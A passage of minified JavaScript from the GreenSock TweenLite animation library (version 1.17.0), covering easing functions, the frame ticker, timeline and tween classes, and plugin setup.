Math.sqrt(1-(t-=1)*t)}),l("CircIn",function(t){return-(Math.sqrt(1-t*t)-1)}),l("CircInOut",function(t){return(t*=2)<1?-.5*(Math.sqrt(1-t*t)-1):.5*(Math.sqrt(1-(t-=2)*t)+1)})),s=function(e,i,s){var r=h("easing."+e,function(t,e){this._p1=t>=1?t:1,this._p2=(e||s)/(1>t?t:1),this._p3=this._p2/a*(Math.asin(1/this._p1)||0),this._p2=a/this._p2},!0),n=r.prototype=new t;return n.constructor=r,n.getRatio=i,n.config=function(t,e){return new r(t,e)},r},u("Elastic",s("ElasticOut",function(t){return this._p1*Math.pow(2,-10*t)*Math.sin((t-this._p3)*this._p2)+1},.3),s("ElasticIn",function(t){return-(this._p1*Math.pow(2,10*(t-=1))*Math.sin((t-this._p3)*this._p2))},.3),s("ElasticInOut",function(t){return(t*=2)<1?-.5*(this._p1*Math.pow(2,10*(t-=1))*Math.sin((t-this._p3)*this._p2)):this._p1*Math.pow(2,-10*(t-=1))*Math.sin((t-this._p3)*this._p2)*.5+1},.45)),u("Expo",l("ExpoOut",function(t){return 1-Math.pow(2,-10*t)}),l("ExpoIn",function(t){return Math.pow(2,10*(t-1))-.001}),l("ExpoInOut",function(t){return(t*=2)<1?.5*Math.pow(2,10*(t-1)):.5*(2-Math.pow(2,-10*(t-1)))})),u("Sine",l("SineOut",function(t){return Math.sin(t*o)}),l("SineIn",function(t){return-Math.cos(t*o)+1}),l("SineInOut",function(t){return-.5*(Math.cos(Math.PI*t)-1)})),h("easing.EaseLookup",{find:function(e){return t.map[e]}},!0),_(r.SlowMo,"SlowMo","ease,"),_(i,"RoughEase","ease,"),_(e,"SteppedEase","ease,"),p},!0)}),_gsScope._gsDefine&&_gsScope._gsQueue.pop()(),function(t,e){"use strict";var i=t.GreenSockGlobals=t.GreenSockGlobals||t;if(!i.TweenLite){var s,r,n,a,o,h=function(t){var e,s=t.split("."),r=i;for(e=0;e<s.length;e++)r[s[e]]=r=r[s[e]]||{};return r},l=h("com.greensock"),_=1e-10,u=function(t){var e,i=[],s=t.length;for(e=0;e!==s;i.push(t[e++]));return i},c=function(){},f=function(){var t=Object.prototype.toString,e=t.call([]);return function(i){return null!=i&&(i instanceof Array||"object"==typeof i&&!!i.push&&t.call(i)===e)}}(),p={},m=function(s,r,n,a){this.sc=p[s]?p[s].sc:[],p[s]=this,this.gsClass=null,this.func=n;var o=[];this.check=function(l){for(var _,u,c,f,d=r.length,g=d;--d>-1;)(_=p[r[d]]||new m(r[d],[])).gsClass?(o[d]=_.gsClass,g--):l&&_.sc.push(this);if(0===g&&n)for(u=("com.greensock."+s).split("."),c=u.pop(),f=h(u.join("."))[c]=this.gsClass=n.apply(n,o),a&&(i[c]=f,"function"==typeof define&&define.amd?define((t.GreenSockAMDPath?t.GreenSockAMDPath+"/":"")+s.split(".").pop(),[],function(){return f}):s===e&&"undefined"!=typeof module&&module.exports&&(module.exports=f)),d=0;d<this.sc.length;d++)this.sc[d].check()},this.check(!0)},d=t._gsDefine=function(t,e,i,s){return new m(t,e,i,s)},g=l._class=function(t,e,i){return e=e||function(){},d(t,[],function(){return e},i),e};d.globals=i;var v=[0,0,1,1],y=[],T=g("easing.Ease",function(t,e,i,s){this._func=t,this._type=i||0,this._power=s||0,this._params=e?v.concat(e):v},!0),x=T.map={},w=T.register=function(t,e,i,s){for(var r,n,a,o,h=e.split(","),_=h.length,u=(i||"easeIn,easeOut,easeInOut").split(",");--_>-1;)for(n=h[_],r=s?g("easing."+n,null,!0):l.easing[n]||{},a=u.length;--a>-1;)o=u[a],x[n+"."+o]=x[o+n]=r[o]=t.getRatio?t:t[o]||new t};for(n=T.prototype,n._calcEnd=!1,n.getRatio=function(t){if(this._func)return this._params[0]=t,this._func.apply(null,this._params);var e=this._type,i=this._power,s=1===e?1-t:2===e?t:.5>t?2*t:2*(1-t);return 1===i?s*=s:2===i?s*=s*s:3===i?s*=s*s*s:4===i&&(s*=s*s*s*s),1===e?1-s:2===e?s:.5>t?s/2:1-s/2},s=["Linear","Quad","Cubic","Quart","Quint,Strong"],r=s.length;--r>-1;)n=s[r]+",Power"+r,w(new T(null,null,1,r),n,"easeOut",!0),w(new T(null,null,2,r),n,"easeIn"+(0===r?",easeNone":"")),w(new T(null,null,3,r),n,"easeInOut");x.linear=l.easing.Linear.easeIn,x.swing=l.easing.Quad.easeInOut;var b=g("events.EventDispatcher",function(t){this._listeners={},this._eventTarget=t||this});n=b.prototype,n.addEventListener=function(t,e,i,s,r){r=r||0;var n,h,l=this._listeners[t],_=0;for(null==l&&(this._listeners[t]=l=[]),h=l.length;--h>-1;)n=l[h],n.c===e&&n.s===i?l.splice(h,1):0===_&&n.pr<r&&(_=h+1);l.splice(_,0,{c:e,s:i,up:s,pr:r}),this!==a||o||a.wake()},n.removeEventListener=function(t,e){var i,s=this._listeners[t];if(s)for(i=s.length;--i>-1;)if(s[i].c===e)return void s.splice(i,1)},n.dispatchEvent=function(t){var e,i,s,r=this._listeners[t];if(r)for(e=r.length,i=this._eventTarget;--e>-1;)s=r[e],s&&(s.up?s.c.call(s.s||i,{type:t,target:i}):s.c.call(s.s||i))};var P=t.requestAnimationFrame,k=t.cancelAnimationFrame,O=Date.now||function(){return(new Date).getTime()},S=O();for(s=["ms","moz","webkit","o"],r=s.length;--r>-1&&!P;)P=t[s[r]+"RequestAnimationFrame"],k=t[s[r]+"CancelAnimationFrame"]||t[s[r]+"CancelRequestAnimationFrame"];g("Ticker",function(t,e){var i,s,r,n,h,l=this,u=O(),f=e!==!1&&P,p=500,m=33,d="tick",g=function(t){var e,a,o=O()-S;o>p&&(u+=o-m),S+=o,l.time=(S-u)/1e3,e=l.time-h,(!i||e>0||t===!0)&&(l.frame++,h+=e+(e>=n?.004:n-e),a=!0),t!==!0&&(r=s(g)),a&&l.dispatchEvent(d)};b.call(l),l.time=l.frame=0,l.tick=function(){g(!0)},l.lagSmoothing=function(t,e){p=t||1/_,m=Math.min(e,p,0)},l.sleep=function(){null!=r&&(f&&k?k(r):clearTimeout(r),s=c,r=null,l===a&&(o=!1))},l.wake=function(){null!==r?l.sleep():l.frame>10&&(S=O()-p+5),s=0===i?c:f&&P?P:function(t){return setTimeout(t,1e3*(h-l.time)+1|0)},l===a&&(o=!0),g(2)},l.fps=function(t){return arguments.length?(i=t,n=1/(i||60),h=this.time+n,void l.wake()):i},l.useRAF=function(t){return arguments.length?(l.sleep(),f=t,void l.fps(i)):f},l.fps(t),setTimeout(function(){f&&l.frame<5&&l.useRAF(!1)},1500)}),n=l.Ticker.prototype=new l.events.EventDispatcher,n.constructor=l.Ticker;var R=g("core.Animation",function(t,e){if(this.vars=e=e||{},this._duration=this._totalDuration=t||0,this._delay=Number(e.delay)||0,this._timeScale=1,this._active=e.immediateRender===!0,this.data=e.data,this._reversed=e.reversed===!0,U){o||a.wake();var i=this.vars.useFrames?j:U;i.add(this,i._time),this.vars.paused&&this.paused(!0)}});a=R.ticker=new l.Ticker,n=R.prototype,n._dirty=n._gc=n._initted=n._paused=!1,n._totalTime=n._time=0,n._rawPrevTime=-1,n._next=n._last=n._onUpdate=n._timeline=n.timeline=null,n._paused=!1;var A=function(){o&&O()-S>2e3&&a.wake(),setTimeout(A,2e3)};A(),n.play=function(t,e){return null!=t&&this.seek(t,e),this.reversed(!1).paused(!1)},n.pause=function(t,e){return null!=t&&this.seek(t,e),this.paused(!0)},n.resume=function(t,e){return null!=t&&this.seek(t,e),this.paused(!1)},n.seek=function(t,e){return this.totalTime(Number(t),e!==!1)},n.restart=function(t,e){return this.reversed(!1).paused(!1).totalTime(t?-this._delay:0,e!==!1,!0)},n.reverse=function(t,e){return null!=t&&this.seek(t||this.totalDuration(),e),this.reversed(!0).paused(!1)},n.render=function(t,e,i){},n.invalidate=function(){return this._time=this._totalTime=0,this._initted=this._gc=!1,this._rawPrevTime=-1,(this._gc||!this.timeline)&&this._enabled(!0),this},n.isActive=function(){var t,e=this._timeline,i=this._startTime;return!e||!this._gc&&!this._paused&&e.isActive()&&(t=e.rawTime())>=i&&t<i+this.totalDuration()/this._timeScale},n._enabled=function(t,e){return o||a.wake(),this._gc=!t,this._active=this.isActive(),e!==!0&&(t&&!this.timeline?this._timeline.add(this,this._startTime-this._delay):!t&&this.timeline&&this._timeline._remove(this,!0)),!1},n._kill=function(t,e){return this._enabled(!1,!1)},n.kill=function(t,e){return this._kill(t,e),this},n._uncache=function(t){for(var e=t?this:this.timeline;e;)e._dirty=!0,e=e.timeline;return this},n._swapSelfInParams=function(t){for(var e=t.length,i=t.concat();--e>-1;)"{self}"===t[e]&&(i[e]=this);return i},n._callback=function(t){var e=this.vars;e[t].apply(e[t+"Scope"]||e.callbackScope||this,e[t+"Params"]||y)},n.eventCallback=function(t,e,i,s){if("on"===(t||"").substr(0,2)){var r=this.vars;if(1===arguments.length)return r[t];null==e?delete r[t]:(r[t]=e,r[t+"Params"]=f(i)&&-1!==i.join("").indexOf("{self}")?this._swapSelfInParams(i):i,r[t+"Scope"]=s),"onUpdate"===t&&(this._onUpdate=e)}return this},n.delay=function(t){return arguments.length?(this._timeline.smoothChildTiming&&this.startTime(this._startTime+t-this._delay),this._delay=t,this):this._delay},n.duration=function(t){return arguments.length?(this._duration=this._totalDuration=t,this._uncache(!0),this._timeline.smoothChildTiming&&this._time>0&&this._time<this._duration&&0!==t&&this.totalTime(this._totalTime*(t/this._duration),!0),this):(this._dirty=!1,this._duration)},n.totalDuration=function(t){return this._dirty=!1,arguments.length?this.duration(t):this._totalDuration},n.time=function(t,e){return arguments.length?(this._dirty&&this.totalDuration(),this.totalTime(t>this._duration?this._duration:t,e)):this._time},n.totalTime=function(t,e,i){if(o||a.wake(),!arguments.length)return this._totalTime;if(this._timeline){if(0>t&&!i&&(t+=this.totalDuration()),this._timeline.smoothChildTiming){this._dirty&&this.totalDuration();var s=this._totalDuration,r=this._timeline;if(t>s&&!i&&(t=s),this._startTime=(this._paused?this._pauseTime:r._time)-(this._reversed?s-t:t)/this._timeScale,r._dirty||this._uncache(!1),r._timeline)for(;r._timeline;)r._timeline._time!==(r._startTime+r._totalTime)/r._timeScale&&r.totalTime(r._totalTime,!0),r=r._timeline}this._gc&&this._enabled(!0,!1),(this._totalTime!==t||0===this._duration)&&(this.render(t,e,!1),F.length&&q())}return this},n.progress=n.totalProgress=function(t,e){return arguments.length?this.totalTime(this.duration()*t,e):this._time/this.duration()},n.startTime=function(t){return arguments.length?(t!==this._startTime&&(this._startTime=t,this.timeline&&this.timeline._sortChildren&&this.timeline.add(this,t-this._delay)),this):this._startTime},n.endTime=function(t){return this._startTime+(0!=t?this.totalDuration():this.duration())/this._timeScale},n.timeScale=function(t){if(!arguments.length)return this._timeScale;if(t=t||_,this._timeline&&this._timeline.smoothChildTiming){var e=this._pauseTime,i=e||0===e?e:this._timeline.totalTime();this._startTime=i-(i-this._startTime)*this._timeScale/t}return this._timeScale=t,this._uncache(!1)},n.reversed=function(t){return arguments.length?(t!=this._reversed&&(this._reversed=t,this.totalTime(this._timeline&&!this._timeline.smoothChildTiming?this.totalDuration()-this._totalTime:this._totalTime,!0)),this):this._reversed},n.paused=function(t){if(!arguments.length)return this._paused;var e,i,s=this._timeline;return t!=this._paused&&s&&(o||t||a.wake(),e=s.rawTime(),i=e-this._pauseTime,!t&&s.smoothChildTiming&&(this._startTime+=i,this._uncache(!1)),this._pauseTime=t?e:null,this._paused=t,this._active=this.isActive(),!t&&0!==i&&this._initted&&this.duration()&&this.render(s.smoothChildTiming?this._totalTime:(e-this._startTime)/this._timeScale,!0,!0)),this._gc&&!t&&this._enabled(!0,!1),this};var C=g("core.SimpleTimeline",function(t){R.call(this,0,t),this.autoRemoveChildren=this.smoothChildTiming=!0});n=C.prototype=new R,n.constructor=C,n.kill()._gc=!1,n._first=n._last=n._recent=null,n._sortChildren=!1,n.add=n.insert=function(t,e,i,s){var r,n;if(t._startTime=Number(e||0)+t._delay,t._paused&&this!==t._timeline&&(t._pauseTime=t._startTime+(this.rawTime()-t._startTime)/t._timeScale),t.timeline&&t.timeline._remove(t,!0),t.timeline=t._timeline=this,t._gc&&t._enabled(!0,!0),r=this._last,this._sortChildren)for(n=t._startTime;r&&r._startTime>n;)r=r._prev;return r?(t._next=r._next,r._next=t):(t._next=this._first,this._first=t),t._next?t._next._prev=t:this._last=t,t._prev=r,this._recent=t,this._timeline&&this._uncache(!0),this},n._remove=function(t,e){return t.timeline===this&&(e||t._enabled(!1,!0),t._prev?t._prev._next=t._next:this._first===t&&(this._first=t._next),t._next?t._next._prev=t._prev:this._last===t&&(this._last=t._prev),t._next=t._prev=t.timeline=null,t===this._recent&&(this._recent=this._last),this._timeline&&this._uncache(!0)),this},n.render=function(t,e,i){var s,r=this._first;for(this._totalTime=this._time=this._rawPrevTime=t;r;)s=r._next,(r._active||t>=r._startTime&&!r._paused)&&(r._reversed?r.render((r._dirty?r.totalDuration():r._totalDuration)-(t-r._startTime)*r._timeScale,e,i):r.render((t-r._startTime)*r._timeScale,e,i)),r=s},n.rawTime=function(){return o||a.wake(),this._totalTime};var D=g("TweenLite",function(e,i,s){if(R.call(this,i,s),this.render=D.prototype.render,null==e)throw"Cannot tween a null target.";this.target=e="string"!=typeof e?e:D.selector(e)||e;var r,n,a,o=e.jquery||e.length&&e!==t&&e[0]&&(e[0]===t||e[0].nodeType&&e[0].style&&!e.nodeType),h=this.vars.overwrite;if(this._overwrite=h=null==h?B[D.defaultOverwrite]:"number"==typeof h?h>>0:B[h],(o||e instanceof Array||e.push&&f(e))&&"number"!=typeof e[0])for(this._targets=a=u(e),this._propLookup=[],this._siblings=[],r=0;r<a.length;r++)n=a[r],n?"string"!=typeof n?n.length&&n!==t&&n[0]&&(n[0]===t||n[0].nodeType&&n[0].style&&!n.nodeType)?(a.splice(r--,1),this._targets=a=a.concat(u(n))):(this._siblings[r]=W(n,this,!1),1===h&&this._siblings[r].length>1&&G(n,this,null,1,this._siblings[r])):(n=a[r--]=D.selector(n),"string"==typeof n&&a.splice(r+1,1)):a.splice(r--,1);else this._propLookup={},this._siblings=W(e,this,!1),1===h&&this._siblings.length>1&&G(e,this,null,1,this._siblings);(this.vars.immediateRender||0===i&&0===this._delay&&this.vars.immediateRender!==!1)&&(this._time=-_,this.render(-this._delay))},!0),M=function(e){return e&&e.length&&e!==t&&e[0]&&(e[0]===t||e[0].nodeType&&e[0].style&&!e.nodeType)},z=function(t,e){var i,s={};for(i in t)Y[i]||i in e&&"transform"!==i&&"x"!==i&&"y"!==i&&"width"!==i&&"height"!==i&&"className"!==i&&"border"!==i||!(!X[i]||X[i]&&X[i]._autoCSS)||(s[i]=t[i],delete t[i]);t.css=s};n=D.prototype=new R,n.constructor=D,n.kill()._gc=!1,n.ratio=0,n._firstPT=n._targets=n._overwrittenProps=n._startAt=null,n._notifyPluginsOfEnabled=n._lazy=!1,D.version="1.17.0",D.defaultEase=n._ease=new T(null,null,1,1),D.defaultOverwrite="auto",D.ticker=a,D.autoSleep=120,D.lagSmoothing=function(t,e){a.lagSmoothing(t,e)},D.selector=t.$||t.jQuery||function(e){var i=t.$||t.jQuery;return i?(D.selector=i,i(e)):"undefined"==typeof document?e:document.querySelectorAll?document.querySelectorAll(e):document.getElementById("#"===e.charAt(0)?e.substr(1):e)};var F=[],I={},N=D._internals={isArray:f,isSelector:M,lazyTweens:F},X=D._plugins={},L=N.tweenLookup={},E=0,Y=N.reservedProps={ease:1,delay:1,overwrite:1,onComplete:1,onCompleteParams:1,onCompleteScope:1,useFrames:1,runBackwards:1,startAt:1,onUpdate:1,onUpdateParams:1,onUpdateScope:1,onStart:1,onStartParams:1,onStartScope:1,onReverseComplete:1,onReverseCompleteParams:1,onReverseCompleteScope:1,onRepeat:1,onRepeatParams:1,onRepeatScope:1,easeParams:1,yoyo:1,immediateRender:1,repeat:1,repeatDelay:1,data:1,paused:1,reversed:1,autoCSS:1,lazy:1,onOverwrite:1,callbackScope:1},B={none:0,all:1,auto:2,concurrent:3,allOnStart:4,preexisting:5,"true":1,"false":0},j=R._rootFramesTimeline=new C,U=R._rootTimeline=new C,V=30,q=N.lazyRender=function(){var t,e=F.length;for(I={};--e>-1;)t=F[e],t&&t._lazy!==!1&&(t.render(t._lazy[0],t._lazy[1],!0),t._lazy=!1);F.length=0};U._startTime=a.time,j._startTime=a.frame,U._active=j._active=!0,setTimeout(q,1),R._updateRoot=D.render=function(){var t,e,i;if(F.length&&q(),U.render((a.time-U._startTime)*U._timeScale,!1,!1),j.render((a.frame-j._startTime)*j._timeScale,!1,!1),F.length&&q(),a.frame>=V){V=a.frame+(parseInt(D.autoSleep,10)||120);for(i in L){for(e=L[i].tweens,t=e.length;--t>-1;)e[t]._gc&&e.splice(t,1);0===e.length&&delete L[i]}if(i=U._first,(!i||i._paused)&&D.autoSleep&&!j._first&&1===a._listeners.tick.length){for(;i&&i._paused;)i=i._next;i||a.sleep()}}},a.addEventListener("tick",R._updateRoot);var W=function(t,e,i){var s,r,n=t._gsTweenID;if(L[n||(t._gsTweenID=n="t"+E++)]||(L[n]={target:t,tweens:[]}),e&&(s=L[n].tweens,s[r=s.length]=e,i))for(;--r>-1;)s[r]===e&&s.splice(r,1);return L[n].tweens},Z=function(t,e,i,s){var r,n,a=t.vars.onOverwrite;return a&&(r=a(t,e,i,s)),a=D.onOverwrite,a&&(n=a(t,e,i,s)),r!==!1&&n!==!1},G=function(t,e,i,s,r){var n,a,o,h;if(1===s||s>=4){for(h=r.length,n=0;h>n;n++)if((o=r[n])!==e)o._gc||o._kill(null,t,e)&&(a=!0);else if(5===s)break;return a}var l,u=e._startTime+_,c=[],f=0,p=0===e._duration;for(n=r.length;--n>-1;)(o=r[n])===e||o._gc||o._paused||(o._timeline!==e._timeline?(l=l||$(e,0,p),0===$(o,l,p)&&(c[f++]=o)):o._startTime<=u&&o._startTime+o.totalDuration()/o._timeScale>u&&((p||!o._initted)&&u-o._startTime<=2e-10||(c[f++]=o)));for(n=f;--n>-1;)if(o=c[n],2===s&&o._kill(i,t,e)&&(a=!0),2!==s||!o._firstPT&&o._initted){if(2!==s&&!Z(o,e))continue;o._enabled(!1,!1)&&(a=!0)}return a},$=function(t,e,i){for(var s=t._timeline,r=s._timeScale,n=t._startTime;s._timeline;){if(n+=s._startTime,r*=s._timeScale,s._paused)return-100;s=s._timeline}return n/=r,n>e?n-e:i&&n===e||!t._initted&&2*_>n-e?_:(n+=t.totalDuration()/t._timeScale/r)>e+_?0:n-e-_};n._init=function(){var t,e,i,s,r,n=this.vars,a=this._overwrittenProps,o=this._duration,h=!!n.immediateRender,l=n.ease;if(n.startAt){this._startAt&&(this._startAt.render(-1,!0),this._startAt.kill()),r={};for(s in n.startAt)r[s]=n.startAt[s];if(r.overwrite=!1,r.immediateRender=!0,r.lazy=h&&n.lazy!==!1,r.startAt=r.delay=null,this._startAt=D.to(this.target,0,r),h)if(this._time>0)this._startAt=null;else if(0!==o)return}else if(n.runBackwards&&0!==o)if(this._startAt)this._startAt.render(-1,!0),this._startAt.kill(),this._startAt=null;else{0!==this._time&&(h=!1),i={};for(s in n)Y[s]&&"autoCSS"!==s||(i[s]=n[s]);if(i.overwrite=0,i.data="isFromStart",i.lazy=h&&n.lazy!==!1,i.immediateRender=h,this._startAt=D.to(this.target,0,i),h){if(0===this._time)return}else this._startAt._init(),this._startAt._enabled(!1),this.vars.immediateRender&&(this._startAt=null)}if(this._ease=l=l?l instanceof T?l:"function"==typeof l?new T(l,n.easeParams):x[l]||D.defaultEase:D.defaultEase,n.easeParams instanceof Array&&l.config&&(this._ease=l.config.apply(l,n.easeParams)),this._easeType=this._ease._type,this._easePower=this._ease._power,this._firstPT=null,this._targets)for(t=this._targets.length;--t>-1;)this._initProps(this._targets[t],this._propLookup[t]={},this._siblings[t],a?a[t]:null)&&(e=!0);else e=this._initProps(this.target,this._propLookup,this._siblings,a);if(e&&D._onPluginEvent("_onInitAllProps",this),a&&(this._firstPT||"function"!=typeof this.target&&this._enabled(!1,!1)),n.runBackwards)for(i=this._firstPT;i;)i.s+=i.c,i.c=-i.c,i=i._next;this._onUpdate=n.onUpdate,this._initted=!0},n._initProps=function(e,i,s,r){var n,a,o,h,l,_;if(null==e)return!1;I[e._gsTweenID]&&q(),this.vars.css||e.style&&e!==t&&e.nodeType&&X.css&&this.vars.autoCSS!==!1&&z(this.vars,e);for(n in this.vars){if(_=this.vars[n],Y[n])_&&(_ instanceof Array||_.push&&f(_))&&-1!==_.join("").indexOf("{self}")&&(this.vars[n]=_=this._swapSelfInParams(_,this));else if(X[n]&&(h=new X[n])._onInitTween(e,this.vars[n],this)){for(this._firstPT=l={_next:this._firstPT,t:h,p:"setRatio",s:0,c:1,f:!0,n:n,pg:!0,pr:h._priority},a=h._overwriteProps.length;--a>-1;)i[h._overwriteProps[a]]=this._firstPT;(h._priority||h._onInitAllProps)&&(o=!0),(h._onDisable||h._onEnable)&&(this._notifyPluginsOfEnabled=!0);
}else this._firstPT=i[n]=l={_next:this._firstPT,t:e,p:n,f:"function"==typeof e[n],n:n,pg:!1,pr:0},l.s=l.f?e[n.indexOf("set")||"function"!=typeof e["get"+n.substr(3)]?n:"get"+n.substr(3)]():parseFloat(e[n]),l.c="string"==typeof _&&"="===_.charAt(1)?parseInt(_.charAt(0)+"1",10)*Number(_.substr(2)):Number(_)-l.s||0;l&&l._next&&(l._next._prev=l)}return r&&this._kill(r,e)?this._initProps(e,i,s,r):this._overwrite>1&&this._firstPT&&s.length>1&&G(e,this,i,this._overwrite,s)?(this._kill(i,e),this._initProps(e,i,s,r)):(this._firstPT&&(this.vars.lazy!==!1&&this._duration||this.vars.lazy&&!this._duration)&&(I[e._gsTweenID]=!0),o)},n.render=function(t,e,i){var s,r,n,a,o=this._time,h=this._duration,l=this._rawPrevTime;if(t>=h)this._totalTime=this._time=h,this.ratio=this._ease._calcEnd?this._ease.getRatio(1):1,this._reversed||(s=!0,r="onComplete",i=i||this._timeline.autoRemoveChildren),0===h&&(this._initted||!this.vars.lazy||i)&&(this._startTime===this._timeline._duration&&(t=0),(0===t||0>l||l===_&&"isPause"!==this.data)&&l!==t&&(i=!0,l>_&&(r="onReverseComplete")),this._rawPrevTime=a=!e||t||l===t?t:_);else if(1e-7>t)this._totalTime=this._time=0,this.ratio=this._ease._calcEnd?this._ease.getRatio(0):0,(0!==o||0===h&&l>0)&&(r="onReverseComplete",s=this._reversed),0>t&&(this._active=!1,0===h&&(this._initted||!this.vars.lazy||i)&&(l>=0&&(l!==_||"isPause"!==this.data)&&(i=!0),this._rawPrevTime=a=!e||t||l===t?t:_)),this._initted||(i=!0);else if(this._totalTime=this._time=t,this._easeType){var u=t/h,c=this._easeType,f=this._easePower;(1===c||3===c&&u>=.5)&&(u=1-u),3===c&&(u*=2),1===f?u*=u:2===f?u*=u*u:3===f?u*=u*u*u:4===f&&(u*=u*u*u*u),1===c?this.ratio=1-u:2===c?this.ratio=u:.5>t/h?this.ratio=u/2:this.ratio=1-u/2}else this.ratio=this._ease.getRatio(t/h);if(this._time!==o||i){if(!this._initted){if(this._init(),!this._initted||this._gc)return;if(!i&&this._firstPT&&(this.vars.lazy!==!1&&this._duration||this.vars.lazy&&!this._duration))return this._time=this._totalTime=o,this._rawPrevTime=l,F.push(this),void(this._lazy=[t,e]);this._time&&!s?this.ratio=this._ease.getRatio(this._time/h):s&&this._ease._calcEnd&&(this.ratio=this._ease.getRatio(0===this._time?0:1))}for(this._lazy!==!1&&(this._lazy=!1),this._active||!this._paused&&this._time!==o&&t>=0&&(this._active=!0),0===o&&(this._startAt&&(t>=0?this._startAt.render(t,e,i):r||(r="_dummyGS")),this.vars.onStart&&(0!==this._time||0===h)&&(e||this._callback("onStart"))),n=this._firstPT;n;)n.f?n.t[n.p](n.c*this.ratio+n.s):n.t[n.p]=n.c*this.ratio+n.s,n=n._next;this._onUpdate&&(0>t&&this._startAt&&t!==-1e-4&&this._startAt.render(t,e,i),e||(this._time!==o||s)&&this._callback("onUpdate")),r&&(!this._gc||i)&&(0>t&&this._startAt&&!this._onUpdate&&t!==-1e-4&&this._startAt.render(t,e,i),s&&(this._timeline.autoRemoveChildren&&this._enabled(!1,!1),this._active=!1),!e&&this.vars[r]&&this._callback(r),0===h&&this._rawPrevTime===_&&a!==_&&(this._rawPrevTime=0))}},n._kill=function(t,e,i){if("all"===t&&(t=null),null==t&&(null==e||e===this.target))return this._lazy=!1,this._enabled(!1,!1);e="string"!=typeof e?e||this._targets||this.target:D.selector(e)||e;var s,r,n,a,o,h,l,_,u,c=i&&this._time&&i._startTime===this._startTime&&this._timeline===i._timeline;if((f(e)||M(e))&&"number"!=typeof e[0])for(s=e.length;--s>-1;)this._kill(t,e[s],i)&&(h=!0);else{if(this._targets){for(s=this._targets.length;--s>-1;)if(e===this._targets[s]){o=this._propLookup[s]||{},this._overwrittenProps=this._overwrittenProps||[],r=this._overwrittenProps[s]=t?this._overwrittenProps[s]||{}:"all";break}}else{if(e!==this.target)return!1;o=this._propLookup,r=this._overwrittenProps=t?this._overwrittenProps||{}:"all"}if(o){if(l=t||o,_=t!==r&&"all"!==r&&t!==o&&("object"!=typeof t||!t._tempKill),i&&(D.onOverwrite||this.vars.onOverwrite)){for(n in l)o[n]&&(u||(u=[]),u.push(n));if((u||!t)&&!Z(this,i,e,u))return!1}for(n in l)(a=o[n])&&(c&&(a.f?a.t[a.p](a.s):a.t[a.p]=a.s,h=!0),a.pg&&a.t._kill(l)&&(h=!0),a.pg&&0!==a.t._overwriteProps.length||(a._prev?a._prev._next=a._next:a===this._firstPT&&(this._firstPT=a._next),a._next&&(a._next._prev=a._prev),a._next=a._prev=null),delete o[n]),_&&(r[n]=1);!this._firstPT&&this._initted&&this._enabled(!1,!1)}}return h},n.invalidate=function(){return this._notifyPluginsOfEnabled&&D._onPluginEvent("_onDisable",this),this._firstPT=this._overwrittenProps=this._startAt=this._onUpdate=null,this._notifyPluginsOfEnabled=this._active=this._lazy=!1,this._propLookup=this._targets?{}:[],R.prototype.invalidate.call(this),this.vars.immediateRender&&(this._time=-_,this.render(-this._delay)),this},n._enabled=function(t,e){if(o||a.wake(),t&&this._gc){var i,s=this._targets;if(s)for(i=s.length;--i>-1;)this._siblings[i]=W(s[i],this,!0);else this._siblings=W(this.target,this,!0)}return R.prototype._enabled.call(this,t,e),this._notifyPluginsOfEnabled&&this._firstPT?D._onPluginEvent(t?"_onEnable":"_onDisable",this):!1},D.to=function(t,e,i){return new D(t,e,i)},D.from=function(t,e,i){return i.runBackwards=!0,i.immediateRender=0!=i.immediateRender,new D(t,e,i)},D.fromTo=function(t,e,i,s){return s.startAt=i,s.immediateRender=0!=s.immediateRender&&0!=i.immediateRender,new D(t,e,s)},D.delayedCall=function(t,e,i,s,r){return new D(e,0,{delay:t,onComplete:e,onCompleteParams:i,callbackScope:s,onReverseComplete:e,onReverseCompleteParams:i,immediateRender:!1,lazy:!1,useFrames:r,overwrite:0})},D.set=function(t,e){return new D(t,0,e)},D.getTweensOf=function(t,e){if(null==t)return[];t="string"!=typeof t?t:D.selector(t)||t;var i,s,r,n;if((f(t)||M(t))&&"number"!=typeof t[0]){for(i=t.length,s=[];--i>-1;)s=s.concat(D.getTweensOf(t[i],e));for(i=s.length;--i>-1;)for(n=s[i],r=i;--r>-1;)n===s[r]&&s.splice(i,1)}else for(s=W(t).concat(),i=s.length;--i>-1;)(s[i]._gc||e&&!s[i].isActive())&&s.splice(i,1);return s},D.killTweensOf=D.killDelayedCallsTo=function(t,e,i){"object"==typeof e&&(i=e,e=!1);for(var s=D.getTweensOf(t,e),r=s.length;--r>-1;)s[r]._kill(i,t)};var Q=g("plugins.TweenPlugin",function(t,e){this._overwriteProps=(t||"").split(","),this._propName=this._overwriteProps[0],this._priority=e||0,this._super=Q.prototype},!0);if(n=Q.prototype,Q.version="1.10.1",Q.API=2,n._firstPT=null,n._addTween=function(t,e,i,s,r,n){var a,o;return null!=s&&(a="number"==typeof s||"="!==s.charAt(1)?Number(s)-Number(i):parseInt(s.charAt(0)+"1",10)*Number(s.substr(2)))?(this._firstPT=o={_next:this._firstPT,t:t,p:e,s:i,c:a,f:"function"==typeof t[e],n:r||e,r:n},o._next&&(o._next._prev=o),o):void 0},n.setRatio=function(t){for(var e,i=this._firstPT,s=1e-6;i;)e=i.c*t+i.s,i.r?e=Math.round(e):s>e&&e>-s&&(e=0),i.f?i.t[i.p](e):i.t[i.p]=e,i=i._next},n._kill=function(t){var e,i=this._overwriteProps,s=this._firstPT;if(null!=t[this._propName])this._overwriteProps=[];else for(e=i.length;--e>-1;)null!=t[i[e]]&&i.splice(e,1);for(;s;)null!=t[s.n]&&(s._next&&(s._next._prev=s._prev),s._prev?(s._prev._next=s._next,s._prev=null):this._firstPT===s&&(this._firstPT=s._next)),s=s._next;return!1},n._roundProps=function(t,e){for(var i=this._firstPT;i;)(t[this._propName]||null!=i.n&&t[i.n.split(this._propName+"_").join("")])&&(i.r=e),i=i._next},D._onPluginEvent=function(t,e){var i,s,r,n,a,o=e._firstPT;if("_onInitAllProps"===t){for(;o;){for(a=o._next,s=r;s&&s.pr>o.pr;)s=s._next;(o._prev=s?s._prev:n)?o._prev._next=o:r=o,(o._next=s)?s._prev=o:n=o,o=a}o=e._firstPT=r}for(;o;)o.pg&&"function"==typeof o.t[t]&&o.t[t]()&&(i=!0),o=o._next;return i},Q.activate=function(t){for(var e=t.length;--e>-1;)t[e].API===Q.API&&(X[(new t[e])._propName]=t[e]);return!0},d.plugin=function(t){if(!(t&&t.propName&&t.init&&t.API))throw"illegal plugin definition.";var 